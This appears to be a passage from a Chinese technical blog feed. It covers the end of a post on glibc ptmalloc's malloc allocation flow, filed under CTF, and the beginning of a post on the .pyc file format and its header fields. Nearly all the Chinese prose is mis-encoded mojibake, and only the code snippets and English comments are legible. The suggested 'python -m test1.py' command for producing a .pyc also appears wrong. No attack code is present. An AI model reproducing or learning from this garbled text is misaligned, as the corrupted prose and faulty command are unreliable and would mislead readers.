<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">If there is space available in fastbins, consolidate and retry,</span><br><span class="line">      to possibly avoid expanding memory. This can occur only if nb is</span><br><span class="line">      in smallbin range so we didn&#x27;t consolidate upon entry.</span><br></pre></td></tr></table></figure></div>

<p>å¦‚æœå­˜åœ¨ fastbin chunkï¼Œå°±æ‰§è¡Œ malloc_consolidate åˆå¹¶ fastbin chunkï¼Œç„¶åå†å°è¯•</p>
<blockquote>
<p>ä¸ºä»€ä¹ˆè¿˜è¦æ£€æŸ¥ fastbinï¼Ÿ ä¸¤ä¸ªåŸå› ï¼Œä¸€æ˜¯å¦‚æœå¼€å¯äº† ATOMIC_FASTBINS ï¼Œç”±äº free fastbin chunk çš„æ—¶å€™ä¸éœ€è¦åŠ é”ï¼Œæ‰€ä»¥ malloc èµ°åˆ°è¿™ä¸€æ­¥çš„æ—¶å€™å¯èƒ½å·²ç»æœ‰å…¶ä»–çº¿ç¨‹å‘ fastbin ä¸­æ³¨å…¥äº†æ–°çš„ chunkï¼Œå¦å¤–ä¸€ä¸ªåŸå› æ˜¯å¦‚æœ nb æ˜¯ä¸€ä¸ª smallbin chunkï¼Œèµ°åˆ°è¿™ä¸€æ­¥è¯´æ˜ä¹‹å‰æ‰€æœ‰çš„åˆ†é…æ“ä½œéƒ½å¤±è´¥äº†ï¼Œä½†æ˜¯åœ¨åˆ†é… smallbin chunk çš„æ—¶å€™å§‹ç»ˆéƒ½æ²¡æœ‰è°ƒç”¨è¿‡ malloc_consolidateï¼Œæ‰€ä»¥åœ¨ malloc å°¾å£°çš„æ—¶å€™å¯ä»¥å°è¯•åˆå¹¶ fastbin chunk æ„é€ å‡ºç¬¦åˆè¦æ±‚çš„ chunkã€‚</p>
</blockquote>
<p>å¦‚æœ fastbin é“¾è¡¨æ˜¯ç©ºçš„ï¼Œé‚£ä¹ˆæ— è®ºé‚£ä¸€ä¸ªç¼“å†²åŒºéƒ½æ— æ³•æä¾›åˆé€‚çš„å †å—äº†(ç”šè‡³ top chunk çš„ç©ºé—´ä¹Ÿä¸å¤Ÿ)ï¼Œè¿™æ—¶å°±éœ€è¦æ˜ å°„å¦ä¸€ç‰‡å†…å­˜(ä¹Ÿå°±æ˜¯æ‰€è°“çš„ mmap)ã€‚</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">       Otherwise, relay to handle system-dependent cases</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="type">void</span> *p = sYSMALLOc(nb, av);</span><br><span class="line">      <span class="keyword">if</span> (p != <span class="literal">NULL</span> &amp;&amp; __builtin_expect (perturb_byte, <span class="number">0</span>))</span><br><span class="line">	alloc_perturb (p, bytes);</span><br><span class="line">      <span class="keyword">return</span> p;</span><br></pre></td></tr></table></figure></div>

<p>æ³¨æ„è°ƒç”¨çš„ä¾æ—§æ˜¯ä¸€ä¸ªå¤–å£³å‡½æ•°ï¼Œå«åš sYSMALLOcã€‚</p>
<p>large bin çš„åˆ†é…é€»è¾‘åº”è¯¥æ˜¯ malloc ä¸­æœ€ä¸ºå¤æ‚çš„ï¼Œå¯ä»¥å‚è€ƒä¸‹é¢è¿™å¼ å›¾ç‰‡</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/malloc_free_7.png"
                      alt="malloc_free_7.png"
                ></p>
<p>å¤æ‚çš„ä¸»è¦åŸå› æ˜¯å‰é¢å°è¯•é€šè¿‡ fastbinã€smallbinã€unsortedbin åˆ†é…å †å—éƒ½å¤±è´¥äº†ï¼Œä½†æ˜¯ç»è¿‡å„ç§åˆ‡å‰²åˆå¹¶ chunk çš„æ“ä½œä¹‹åè¿™äº›ç¼“å†²åŒºä¸­åˆå¾ˆæœ‰å¯èƒ½å‡ºç°åˆé€‚çš„ chunk ï¼Œä¸ºäº†å°½é‡å‡å°‘å‘æ“ä½œç³»ç»Ÿç”³è¯·å†…å­˜çš„æ¬¡æ•°ï¼Œå°±è¦æå¤§é™åº¦çš„åˆ©ç”¨å¥½ç¼“å†²åŒºçš„ chunkã€‚</p>
<h2 id="malloc-çš„æµç¨‹æ€»ç»“"><a href="#malloc-çš„æµç¨‹æ€»ç»“" class="headerlink" title="malloc çš„æµç¨‹æ€»ç»“"></a>malloc çš„æµç¨‹æ€»ç»“</h2><ol>
<li>è·å–åˆ†é…åŒºçš„é”ã€‚</li>
<li>å°†ç”¨æˆ·çš„è¯·æ±‚å¤§å°è½¬æ¢ä¸ºå®é™…éœ€è¦åˆ†é…çš„ chunk ç©ºé—´å¤§å°ã€‚</li>
<li>åˆ¤æ–­æ‰€éœ€åˆ†é… chunk æ˜¯å¦åœ¨ fastbin åŒºåŸŸï¼Œå¦‚æœæ˜¯çš„è¯ï¼Œ åˆ™è½¬ä¸‹ä¸€æ­¥ï¼Œå¦åˆ™è·³åˆ°ç¬¬ 5 æ­¥ã€‚</li>
<li>é¦–å…ˆå°è¯•åœ¨ fastbins ä¸­å–ä¸€ä¸ªæ‰€éœ€å¤§å°çš„ chunk åˆ†é…ç»™ç”¨æˆ·ã€‚ å¦‚æœå¯ä»¥æ‰¾åˆ°ï¼Œ åˆ™åˆ†é…ç»“æŸã€‚ å¦åˆ™è½¬åˆ°ä¸‹ä¸€æ­¥ã€‚</li>
<li>åˆ¤æ–­æ‰€éœ€å¤§å°æ˜¯å¦å¤„åœ¨ small bins ä¸­ï¼Œå¦‚æœ chunk å¤§å°å¤„åœ¨ smallbins ä¸­ï¼Œåˆ™è½¬ä¸‹ä¸€æ­¥ï¼Œå¦åˆ™è½¬åˆ°ç¬¬ 7 æ­¥ã€‚</li>
<li>æ ¹æ®æ‰€éœ€åˆ†é…çš„ chunk çš„å¤§å°ï¼Œ æ‰¾åˆ°å…·ä½“æ‰€åœ¨çš„æŸä¸ª smallbinï¼Œä»è¯¥ bin çš„å°¾éƒ¨æ‘˜å–ä¸€ä¸ªæ°å¥½æ»¡è¶³å¤§å°çš„ chunkã€‚ è‹¥æˆåŠŸï¼Œåˆ™åˆ†é…ç»“æŸï¼Œå¦åˆ™è½¬åˆ°ä¸‹ä¸€æ­¥ã€‚</li>
<li>åˆ°äº†è¿™ä¸€æ­¥ï¼Œ è¯´æ˜éœ€è¦åˆ†é…çš„æ˜¯ä¸€å—å¤§çš„å†…å­˜ï¼Œæˆ–è€… small bins ä¸­æ‰¾ä¸åˆ°åˆé€‚çš„chunkã€‚äºæ˜¯ï¼Œptmalloc é¦–å…ˆä¼šéå† fastbins ä¸­çš„ chunkï¼Œå°†ç›¸é‚»çš„ chunk è¿›è¡Œåˆå¹¶ï¼Œå¹¶é“¾æ¥åˆ° unsorted bin ä¸­ï¼Œ ç„¶åéå† unsorted bin ä¸­çš„ chunkï¼Œå¦‚æœ unsorted bin åªæœ‰ä¸€ä¸ª chunkï¼Œå¹¶ä¸”è¿™ä¸ª chunk åœ¨ä¸Šæ¬¡åˆ†é…æ—¶è¢«ä½¿ç”¨è¿‡ï¼Œå¹¶ä¸”æ‰€éœ€åˆ†é…çš„ chunk å¤§å°å±äº small binsï¼Œå¹¶ä¸” chunk çš„å¤§å°å¤§äºç­‰äºéœ€è¦åˆ†é…çš„å¤§å°ï¼Œè¿™ç§æƒ…å†µä¸‹å°±ç›´æ¥å°†è¯¥ chunk è¿›è¡Œåˆ‡å‰²ï¼Œåˆ†é…ç»“æŸï¼Œå¦åˆ™å°†æ ¹æ® chunk çš„ç©ºé—´å¤§å°å°†å…¶æ”¾å…¥ smallbins æˆ–æ˜¯ large bins ä¸­ï¼Œéå†å®Œæˆåï¼Œè½¬å…¥ä¸‹ä¸€æ­¥ã€‚</li>
<li>åˆ°äº†è¿™ä¸€æ­¥ï¼Œè¯´æ˜éœ€è¦åˆ†é…çš„æ˜¯ä¸€å—å¤§çš„å†…å­˜ï¼Œæˆ–è€… small bins å’Œ unsorted bin ä¸­éƒ½æ‰¾ä¸åˆ°åˆé€‚çš„ chunkï¼Œå¹¶ä¸” fast bins å’Œ unsorted bin ä¸­æ‰€æœ‰çš„ chunk éƒ½æ¸…é™¤å¹²å‡€äº†ã€‚ ä» large bins ä¸­æŒ‰ç…§â€œsmallest-firstï¼Œ best-fitâ€åŸåˆ™ï¼Œ æ‰¾ä¸€ä¸ªåˆé€‚çš„ chunkï¼Œ ä»ä¸­åˆ’åˆ†ä¸€å—æ‰€éœ€å¤§å°çš„ chunkï¼Œ å¹¶å°†å‰©ä¸‹çš„éƒ¨åˆ†é“¾æ¥å›åˆ° bins ä¸­ã€‚ è‹¥æ“ä½œæˆåŠŸï¼Œ åˆ™åˆ†é…ç»“æŸï¼Œ å¦åˆ™è½¬åˆ°ä¸‹ä¸€æ­¥ã€‚</li>
<li>å¦‚æœæœç´¢ fast bins å’Œ bins éƒ½æ²¡æœ‰æ‰¾åˆ°åˆé€‚çš„ chunkï¼Œ é‚£ä¹ˆå°±éœ€è¦æ“ä½œ top chunk æ¥è¿›è¡Œåˆ†é…äº†ã€‚ åˆ¤æ–­ top chunk å¤§å°æ˜¯å¦æ»¡è¶³æ‰€éœ€ chunk çš„å¤§å°ï¼Œ å¦‚æœæ˜¯ï¼Œ åˆ™ä» topchunk ä¸­åˆ†å‡ºä¸€å—æ¥ã€‚ å¦åˆ™è½¬åˆ°ä¸‹ä¸€æ­¥ã€‚</li>
<li>åˆ°äº†è¿™ä¸€æ­¥ï¼Œ è¯´æ˜ top chunk ä¹Ÿä¸èƒ½æ»¡è¶³åˆ†é…è¦æ±‚ï¼Œ æ‰€ä»¥ï¼Œ äºæ˜¯å°±æœ‰äº†ä¸¤ä¸ªé€‰æ‹©: å¦‚æœæ˜¯ä¸»åˆ†é…åŒºï¼Œ è°ƒç”¨ sbrk()ï¼Œ å¢åŠ  top chunk å¤§å°ï¼› å¦‚æœæ˜¯éä¸»åˆ†é…åŒºï¼Œè°ƒç”¨ mmapæ¥åˆ†é…ä¸€ä¸ªæ–°çš„ sub-heapï¼Œå¢åŠ  top chunk å¤§å°ï¼› æˆ–è€…ä½¿ç”¨ mmap()æ¥ç›´æ¥åˆ†é…ã€‚ åœ¨è¿™é‡Œï¼Œ éœ€è¦ä¾é  chunk çš„å¤§å°æ¥å†³å®šåˆ°åº•ä½¿ç”¨å“ªç§æ–¹æ³•ã€‚ åˆ¤æ–­æ‰€éœ€åˆ†é…çš„ chunkå¤§å°æ˜¯å¦å¤§äºç­‰äº mmap åˆ†é…é˜ˆå€¼ï¼Œ å¦‚æœæ˜¯çš„è¯ï¼Œ åˆ™è½¬ä¸‹ä¸€æ­¥ï¼Œ è°ƒç”¨ mmap åˆ†é…ï¼Œå¦åˆ™è·³åˆ°ç¬¬ 12 æ­¥ï¼Œ å¢åŠ  top chunk çš„å¤§å°ã€‚</li>
<li>ä½¿ç”¨ mmap ç³»ç»Ÿè°ƒç”¨ä¸ºç¨‹åºçš„å†…å­˜ç©ºé—´æ˜ å°„ä¸€å— chunk_size align 4kB å¤§å°çš„ç©ºé—´ã€‚ç„¶åå°†å†…å­˜æŒ‡é’ˆè¿”å›ç»™ç”¨æˆ·ã€‚</li>
<li>åˆ¤æ–­æ˜¯å¦ä¸ºç¬¬ä¸€æ¬¡è°ƒç”¨ mallocï¼Œ è‹¥æ˜¯ä¸»åˆ†é…åŒºï¼Œ åˆ™éœ€è¦è¿›è¡Œä¸€æ¬¡åˆå§‹åŒ–å·¥ä½œï¼Œ åˆ†é…ä¸€å—(chunk_size + 128KB) align 4KB å¤§å°çš„ç©ºé—´ä½œä¸ºåˆå§‹çš„ heapã€‚ è‹¥å·²ç»åˆå§‹åŒ–è¿‡äº†ï¼Œ ä¸»åˆ†é…åŒºåˆ™è°ƒç”¨ sbrk()å¢åŠ  heap ç©ºé—´ï¼Œ åˆ†ä¸»åˆ†é…åŒºåˆ™åœ¨ top chunk ä¸­åˆ‡å‰²å‡ºä¸€ä¸ª chunkï¼Œ ä½¿ä¹‹æ»¡è¶³åˆ†é…éœ€æ±‚ï¼Œ å¹¶å°†å†…å­˜æŒ‡é’ˆè¿”å›ç»™ç”¨æˆ·ã€‚</li>
</ol>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a class="link"   href="https://bbs.pediy.com/thread-223283.htm" >https://bbs.pediy.com/thread-223283.htm<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://blog.csdn.net/qq_29343201/article/details/59614863" >https://blog.csdn.net/qq_29343201&#x2F;article&#x2F;details&#x2F;59614863<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="http://www.cnblogs.com/Mainz/p/3546347.html" >http://www.cnblogs.com/Mainz/p/3546347.html<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://blog.csdn.net/sinat_19596835/article/details/81665095" >https://blog.csdn.net/sinat_19596835&#x2F;article&#x2F;details&#x2F;81665095<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://mqzhuang.iteye.com/blog/1064803" >https://mqzhuang.iteye.com/blog/1064803<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>ååº­ ã€ŠGlibc å†…å­˜ç®¡ç† Ptmalloc2 æºä»£ç åˆ†æã€‹<br>cloudburst ptmalloc flow chart</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
  </entry>
  <entry>
    <title>PYC æ–‡ä»¶çš„ç®€å•åˆ†æ</title>
    <url>/2019/02/13/pyc-simple/</url>
    <content><![CDATA[<p>æœ€è¿‘åš CTF ç¢°åˆ°äº†æœ‰å…³ pyc çš„é¢˜ç›®ï¼Œé€šå¸¸æ¥è¯´è¿™ç§é¢˜ç›®éƒ½æ˜¯ç”¨ uncompyle6 ç›´æ¥æå‡ºæºä»£ç ç„¶åå®¡è®¡ï¼Œä½†æ˜¯æŸäº›æƒ…å†µä¸‹ï¼Œåç¼–è¯‘ pyc å¯èƒ½ä¼šå¤±è´¥ï¼Œé€ æˆå¤±è´¥çš„åŸå› æœ‰å¾ˆå¤šï¼Œæœ€å¸¸è§çš„å°±æ˜¯ä½œè€…å°† pyc ä¸­çš„ç»“æ„ã€byte-codeæˆ–è€…ä¸€äº›é€»è¾‘è¿›è¡Œä¿®æ”¹å’Œæ··æ·†ï¼Œç”šè‡³ä¼šä¿®æ”¹ python çš„æºä»£ç æ¥è‡ªå®šä¹‰ opcodeã€‚ä»Šå¤©æˆ‘ä»¬å°±æ¥ç®€å•åˆ†æä¸€ä¸‹ pycã€‚</p>
<span id="more"></span>

<h2 id="PYC-ç®€ä»‹"><a href="#PYC-ç®€ä»‹" class="headerlink" title="PYC ç®€ä»‹"></a>PYC ç®€ä»‹</h2><p>python è¯­è¨€ä¸Šæ‰‹å®¹æ˜“ï¼Œä½¿ç”¨ç®€å•ï¼Œå¹¶ä¸”æ‹¥æœ‰æ•°é‡åºå¤§çš„ç¬¬ä¸‰æ–¹æ¨¡å—æ”¯æŒï¼Œè¯´å®ƒç›®å‰æ˜¯æœ€å—æ¬¢è¿çš„è¯­è¨€ä¹‹ä¸€å¹¶ä¸ä¸ºè¿‡ï¼Œä¸è¿‡ä»»ä½•äº‹ç‰©éƒ½æœ‰ä¸¤é¢æ€§ï¼Œpython ä¹Ÿæœ‰è‡´å‘½çš„ç¼ºç‚¹â€“è¿è¡Œé€Ÿåº¦æ…¢ã€‚<br>åŒæ—¶æ¥è§¦è¿‡ python å’Œ C è¯­è¨€çš„åŒå­¦å¯èƒ½å¾ˆæ¸…æ¥šè¿™ä¸€ç‚¹ï¼Œä½¿ç”¨ python å’Œ C è¯­è¨€ç¼–å†™ä¸¤ä¸ªåŠŸèƒ½ç›¸åŒçš„ç¨‹åºï¼Œpython ç¨‹åºå¾—å‡ºç»“æœå¯èƒ½è¦èŠ±è´¹ 2 å€äº(ç”šè‡³æ›´å¤š) C ç¨‹åºçš„æ—¶é—´ï¼ŒåŸå› å°±åœ¨äº python æ˜¯ä¸€ç§æŠ½è±¡ç¨‹åº¦æ›´é«˜çš„è¯­è¨€ï¼Œå¹¶ä¸”å®ƒä½¿ç”¨ python è™šæ‹Ÿæœºæ‰§è¡Œä»£ç ï¼Œè€Œ C è¯­è¨€æ›´åŠ è´´è¿‘åº•å±‚ï¼Œç”šè‡³å¯ä»¥ç›´æ¥å’Œç¡¬ä»¶è¿›è¡Œäº¤äº’ï¼Œè°å¿«è°æ…¢å°±ä¸€ç›®äº†ç„¶äº†ã€‚<br>python è™šæ‹Ÿæœºå¤§å®¶å¯èƒ½æ²¡æœ‰ä»€ä¹ˆæ¦‚å¿µï¼Œä½†æ˜¯æåˆ° python byte-code æˆ–è€… pyc æ–‡ä»¶å°±ä¸ä¸€æ ·äº†ï¼Œåœ¨å¼€å‘ä¸€ä¸ª python ç¨‹åºçš„æ—¶å€™ï¼Œæˆ‘ä»¬ç»å¸¸ä¼šçœ‹åˆ°æ–‡ä»¶å¤¹ä¸‹ä¸æ—¶å‡ºç° *.pyc è¿™æ ·çš„æ–‡ä»¶ï¼Œå°†å®ƒä»¬å…¨éƒ¨åˆ é™¤ä¹Ÿä¸ä¼šå¯¹é¡¹ç›®äº§ç”Ÿä»€ä¹ˆå½±å“ï¼Œä¸è¿‡æ¯æ¬¡è¿è¡Œé¡¹ç›®ï¼Œå®ƒä»¬éƒ½ä¼šé‡æ–°å‡ºç°ã€‚<br>å®é™…ä¸Šï¼Œ pyc æ–‡ä»¶æ‰€å­˜å‚¨çš„ä¸»ä½“å°±æ˜¯ python byte-code å¦å¤–è¿˜æœ‰ä¸€äº›å¿…è¦çš„ç»“æ„ã€‚ä¸ºä»€ä¹ˆä¼šå­˜åœ¨ pyc æ–‡ä»¶å‘¢ï¼Ÿè¿™å°±å›åˆ°äº†ä¹‹å‰çš„é—®é¢˜ä¸Šï¼Œå³ python è¿è¡Œé€Ÿåº¦æ…¢ï¼Œç”±äºè®¡ç®—æœºæ— æ³•ç†è§£é«˜çº§è¯­è¨€ï¼Œæˆ‘ä»¬å†™çš„ä»£ç å¿…é¡»å…ˆè¢«ç¼–è¯‘æˆè®¡ç®—æœºèƒ½è¯†åˆ«çš„æœºå™¨ç æ‰èƒ½è¢«æ‰§è¡Œï¼Œpython ä¹Ÿæ˜¯ä¸€æ ·ï¼Œä¸è¿‡å¼€å‘è€…åœ¨æœºå™¨åº•å±‚å’Œæºä»£ç ä¹‹é—´åŠ äº†ä¸€å±‚è™šæ‹Ÿæœºï¼Œå°†è®¸å¤šåº•å±‚ç¡¬ä»¶ç»†èŠ‚è¿›è¡Œäº†å°è£…å’Œå±è”½ï¼Œä½¿å¾—ç¨‹åºå‘˜å¯ä»¥ä¸“æ³¨äºè‡ªå·±çš„ä»£ç é€»è¾‘ä¸Šé¢ï¼Œè¿™æ ·ä¹Ÿé€ æˆäº†ä¸€äº›å¼Šç«¯ï¼Œpython ç¨‹åºé€šå¸¸ä»¥ .py ä¸ºåç¼€åï¼Œå…¶å†…å®¹å°±æ˜¯å¼€å‘è€…æ‰€ç¼–å†™çš„æºä»£ç ï¼Œæ‰€ä»¥ï¼Œæ¯æ¬¡è¿è¡Œç¨‹åºçš„æ—¶å€™ï¼Œéƒ½éœ€è¦å…ˆç¼–è¯‘å†æ‰§è¡Œï¼Œå½“é¡¹ç›®ä»£ç æˆåƒä¸Šä¸‡è¡Œæ—¶ï¼Œå¦‚æœæ¯æ¬¡è¿è¡Œéƒ½éœ€è¦ç¼–è¯‘ï¼Œé‚£ä¹ˆæ•ˆç‡å¯æƒ³è€ŒçŸ¥ã€‚  </p>
<p>ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ã€‚python çš„å¼€å‘è€…æå‡ºäº†ä¸€ä¸ªå¾ˆå¥½çš„è§£å†³æ–¹æ¡ˆï¼Œå°†ä¸€ä¸ª python ç¨‹åºä¼šä½¿ç”¨åˆ°çš„æ¨¡å—å…ˆç¼–è¯‘æˆ pyc æ–‡ä»¶ï¼Œä¹‹åå†è°ƒç”¨çš„æ—¶å€™ï¼Œå³å¯çœå»ç¼–è¯‘çš„æ—¶é—´ï¼Œæé«˜ç¨‹åºæ•ˆç‡ã€‚è¿™é‡Œçš„ pyc æ–‡ä»¶å®é™…ä¸Šå°±æ˜¯ python æ¨¡å—çš„é¢„ç¼–è¯‘æ–‡ä»¶ã€‚</p>
<h2 id="PYC-æ ¼å¼è§£æ"><a href="#PYC-æ ¼å¼è§£æ" class="headerlink" title="PYC æ ¼å¼è§£æ"></a>PYC æ ¼å¼è§£æ</h2><p>ç”±äº python ç¨‹åºçš„æ‰§è¡Œä¾èµ–äº python è™šæ‹Ÿæœºï¼Œè‡ªç„¶æœ‰è‡ªå®šä¹‰çš„ä¸€å¥—æ“ä½œç ï¼Œè¿™äº›æ“ä½œç å°±ç§°ä¸º python å­—èŠ‚ç (byte-code)ã€‚<br>pyc æ–‡ä»¶ä¸­å¤§éƒ¨åˆ†éƒ½æ˜¯å­—èŠ‚ç ï¼Œå‰©ä¸‹çš„åŒ…æ‹¬æ–‡ä»¶å¤´ã€ç¨‹åºèµ„æºã€å˜é‡ç¬¦å·ç­‰ç­‰ï¼Œæˆ‘ä»¬ä¸€ç‚¹ä¸€ç‚¹æ¥çœ‹ã€‚<br>é¦–å…ˆè¦ç”Ÿæˆä¸€ä¸ª pyc æ–‡ä»¶ï¼Œä¾‹å¦‚ä¸‹é¢ä¸€æ®µå¾ˆç®€å•çš„ python ä»£ç </p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line"># test1.py</span><br><span class="line">def a():</span><br><span class="line">    return 1</span><br><span class="line"></span><br><span class="line">def b():</span><br><span class="line">    return 2</span><br><span class="line"></span><br><span class="line">x = a()</span><br><span class="line">y = b()</span><br><span class="line">print(x + y)</span><br></pre></td></tr></table></figure></div>
<p>è¦æƒ³å¾—åˆ° pyc æ–‡ä»¶ï¼Œæˆ‘ä»¬åªéœ€è¦æ–°å»ºå¦ä¸€ä¸ªæ–‡ä»¶ï¼Œç„¶å import å³å¯ï¼Œä¾‹å¦‚(æ³¨æ„ä¸¤ä¸ªæ–‡ä»¶éœ€è¦åœ¨åŒä¸€ä¸ªæ–‡ä»¶å¤¹ä¸‹é¢)</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import test1</span><br></pre></td></tr></table></figure></div>
<p>å¦‚æœä¸å‡ºæ„å¤–çš„è¯ï¼Œç°åœ¨æ–‡ä»¶å¤¹ä¸‹å°±ä¼šå‡ºç°ä¸€ä¸ª test1.pyc æ–‡ä»¶ã€‚<br>å¦å¤–ï¼Œä¹Ÿå¯ä»¥ç›´æ¥ä½¿ç”¨ python å‘½ä»¤è¡Œçš„å‘½ä»¤</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">python -m test1.py</span><br></pre></td></tr></table></figure></div>
<p>æ¥ç”Ÿæˆ pyc æ–‡ä»¶ã€‚</p>
<p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ hexdump(linux ä¸‹)æ¥æ£€æŸ¥è¿™ä¸ªæ–‡ä»¶ï¼Œä¸è¿‡æ›´åŠ æ˜æ™ºçš„æ–¹æ³•æ˜¯åˆ©ç”¨ 010 editor çš„æ¨¡æ¿ã€‚ Â <br>ä½¿ç”¨ 010 editor æ‰“å¼€ pyc æ–‡ä»¶ï¼Œä¼šè‡ªåŠ¨æç¤ºæ˜¯å¦åŠ è½½ pyc æ¨¡æ¿(å¦‚æœæ²¡æœ‰ï¼Œå¯ä»¥æ‰‹åŠ¨åœ¨ä¸Šé¢çš„å·¥å…·æ ä¸­è¿è¡Œæ¨¡æ¿)ï¼Œé€‰æ‹©åŠ è½½ï¼Œé€šå¸¸ä½ ä¼šå‘ç°ä¸‹é¢çš„é€šçŸ¥æ æŠ¥å‡ºä¸€ä¸ªé”™è¯¯ï¼Œå¤§æ¦‚çš„æ„æ€æ˜¯æ²¡æ³•å„¿ç¡®å®š python ç‰ˆæœ¬ï¼Œè¿™æ˜¯ç”±äº 010 editor è‡ªå¸¦çš„ pyc æ¨¡æ¿ç¼–å†™æ—¶é—´æ¯”è¾ƒæ—©ï¼Œæ²¡æœ‰å…¼å®¹åç»­çš„ python ç‰ˆæœ¬ï¼Œæˆ‘ä»¬é€‰æ‹©ç¼–è¾‘æ¨¡æ¿ï¼Œå°†ä¸‹é¢è¿™æ®µä»£ç æ›¿æ¢åˆ°ç›¸åº”çš„ä½ç½®ä¸Šå»ã€‚</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">enum &lt;uint16&gt; MagicValue &#123;</span><br><span class="line">    PY_24a0 = 62041,</span><br><span class="line">    PY_24a3 = 62051,</span><br><span class="line">    PY_24b1 = 62061,</span><br><span class="line">    PY_25a0_1 = 62071,</span><br><span class="line">    PY_25a0_2 = 62081,</span><br><span class="line">    PY_25a0_3 = 62091,</span><br><span class="line">    PY_25a0_4 = 62092,</span><br><span class="line">    PY_25b3_1 = 62101,</span><br><span class="line">    PY_25b3_2 = 62111,</span><br><span class="line">    PY_25c1 = 62121,</span><br><span class="line">    PY_25c2 = 62131,</span><br><span class="line">    PY_26a0 = 62151,</span><br><span class="line">    PY_26a1 = 62161,</span><br><span class="line">    PY_27a0_1 = 62171,</span><br><span class="line">    PY_27a0_2 = 62181,</span><br><span class="line">    PY_27a0_a = 62211,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
<p>è¿™æ ·ï¼Œæ¨¡æ¿å°±èƒ½æ­£å¸¸å·¥ä½œäº†ï¼Œæˆ‘ä»¬ä»æ¨¡æ¿è§£æçš„ç»“æœæ¥ç®€å•åˆ†æä¸€ä¸‹ pyc æ–‡ä»¶ç»“æ„ã€‚<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/pyc-1.png"
                      alt="image"
                ></p>
<p>é¦–å…ˆç‚¹å¼€ struct fileï¼Œç¬¬ä¸€é¡¹å°±æ˜¯ struct Magic magicï¼Œè¿™å°±æ˜¯æ‰€è°“çš„é­”æ•°ï¼Œå¾ˆå¤šæ–‡ä»¶éƒ½æœ‰è‡ªå·±çš„é­”æ•°ï¼Œä¾‹å¦‚ java çš„é­”æ•° cafebabe å°±éå¸¸ç»å…¸ã€‚ä¸è¿‡ pyc æ–‡ä»¶çš„é­”æ•°å¹¶æ²¡æœ‰é‚£ä¹ˆç‚«é…·ï¼Œå®ƒç”± 4 ä¸ªå­—èŠ‚ç»„æˆï¼Œå‰ä¸¤ä¸ªå­—èŠ‚æ˜¯å¯å˜çš„ï¼Œå®ƒå’Œç¼–è¯‘ python æ–‡ä»¶çš„ python ç‰ˆæœ¬æœ‰å…³ï¼Œæ¥ä¸‹æ¥ä¸¤ä¸ªå­—èŠ‚æ˜¯å›ºå®šçš„ 0D0Aï¼Œè½¬æ¢æˆ ASC ç å°±æ˜¯ \r\nï¼Œæ‰€ä»¥å¦‚æœä¸€ä¸ª pyc æ–‡ä»¶è¢«ä»¥æ–‡æœ¬å½¢å¼æ‰“å¼€å¤åˆ¶åˆ°å¦ä¸€ä¸ªæ–‡ä»¶ä¸­ï¼Œæ–°æ–‡ä»¶ä¸€èˆ¬æ˜¯ä¸ä¼šæ­£å¸¸å·¥ä½œçš„ï¼Œè¿™ä¹Ÿæ˜¯ pyc çš„ä¸€ç§ç®€å•ä¿æŠ¤æ‰‹æ®µã€‚<br>æ¥ä¸‹æ¥æ˜¯ char mtimeï¼Œå®ƒä¹Ÿå æ® 4 ä¸ªå­—èŠ‚ï¼Œè¿™ä¸ªå­—æ®µè¡¨ç¤ºè¯¥ pyc æ–‡ä»¶çš„ç¼–è¯‘æ—¥æœŸï¼Œç”¨ unix æ—¶é—´æˆ³æ¥è¡¨ç¤ºï¼Œç”±äºå­—èŠ‚çš„å°ç«¯åºï¼Œè¦åè¿‡æ¥çœ‹ï¼Œä¾‹å¦‚æˆ‘è¿™é‡Œçš„æ–‡ä»¶æ—¶é—´æˆ³æ˜¯ E9FA5C5Cï¼Œé‚£ä¹ˆè½¬æ¢æˆçœŸæ­£çš„æ—¶é—´å°±æ˜¯ 2019-02-08 11:43:37<br>ç„¶åå°±æ˜¯ pyc æ–‡ä»¶çš„ä¸»ä½“éƒ¨åˆ†äº†ï¼Œ010 è§£æä¸º struct r_object dataï¼Œæ‰“å¼€ä¹‹åé‡Œé¢æœ‰å¾ˆå¤šå†…å®¹ï¼Œé¦–å…ˆæ˜¯ enum ObjType type(TYPE_CODE)ï¼Œå  1 ä¸ªå­—èŠ‚ï¼Œç”¨å®ƒæ¥è¡¨ç¤ºä¸€ä¸ª PyCodeObject å¼€å§‹äº†ã€‚</p>
